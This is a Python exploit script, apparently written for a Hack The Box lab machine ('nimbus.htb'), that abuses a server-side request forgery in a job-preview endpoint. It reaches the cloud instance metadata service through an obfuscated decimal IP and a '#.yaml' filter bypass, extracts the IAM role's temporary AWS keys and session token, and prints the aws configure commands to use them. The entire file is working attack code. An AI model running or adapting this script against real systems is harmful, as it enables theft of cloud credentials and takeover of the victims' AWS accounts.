#!/usr/bin/env python3

import re
import html
import json
import sys
import requests
from urllib.parse import urljoin

TARGET = "http://nimbus.htb/jobs/preview"
IMDS = "http://2852039166/latest/meta-data/iam/security-credentials/"
REGION = "us-east-1"


def extract_raw_response(page: str) -> str:
    patterns = [
        r"<h3>\s*Raw response\s*</h3>\s*<pre[^>]*>(.*?)</pre>",
        r"<pre[^>]*>(.*?)</pre>",
    ]

    for pattern in patterns:
        m = re.search(pattern, page, re.DOTALL | re.IGNORECASE)
        if m:
            return html.unescape(m.group(1)).strip()

    raise RuntimeError("Raw response non trovata nella pagina HTML")


def ssrf_fetch(url: str) -> str:
    candidates = [
        f"{url}#.yaml",
        url,
    ]

    last_error = None

    for candidate in candidates:
        try:
            r = requests.post(
                TARGET,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data={"url": candidate},
                timeout=15,
            )

            r.raise_for_status()
            return extract_raw_response(r.text)

        except Exception as e:
            last_error = e

    raise RuntimeError(f"SSRF fallita: {last_error}")


def parse_json_maybe_dirty(raw: str) -> dict:
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        start = raw.find("{")
        end = raw.rfind("}")

        if start == -1 or end == -1 or end <= start:
            raise

        return json.loads(raw[start:end + 1])


def shell_quote(value: str) -> str:
    return "'" + value.replace("'", "'\"'\"'") + "'"


def main():
    print("[*] Recupero IAM role...")

    roles_raw = ssrf_fetch(IMDS)
    roles = [line.strip() for line in roles_raw.splitlines() if line.strip()]

    if not roles:
        print("[!] Nessun role trovato")
        print(roles_raw)
        sys.exit(1)

    role = roles[0]
    print(f"[+] Role trovato: {role}")

    print("[*] Recupero credenziali...")

    creds_raw = ssrf_fetch(urljoin(IMDS, role))
    creds = parse_json_maybe_dirty(creds_raw)

    access_key = creds.get("AccessKeyId")
    secret_key = creds.get("SecretAccessKey")
    token = creds.get("Token")

    if not access_key or not secret_key or not token:
        print("[!] Credenziali incomplete:")
        print(json.dumps(creds, indent=2))
        sys.exit(1)

    print("\n[+] Credenziali trovate:")
    print(f"AccessKeyId: {access_key}")
    print(f"SecretAccessKey length: {len(secret_key)}")
    print(f"Token length: {len(token)}")

    print("\n[*] Comandi aws configure:\n")
    print(f"aws configure set aws_access_key_id {shell_quote(access_key)}")
    print(f"aws configure set aws_secret_access_key {shell_quote(secret_key)}")
    print(f"aws configure set aws_session_token {shell_quote(token)}")
    print(f"aws configure set region {shell_quote(REGION)}")
    print("aws configure set output json")

    print("\n[*] Test:")
    print("aws sts get-caller-identity")


if __name__ == "__main__":
    main()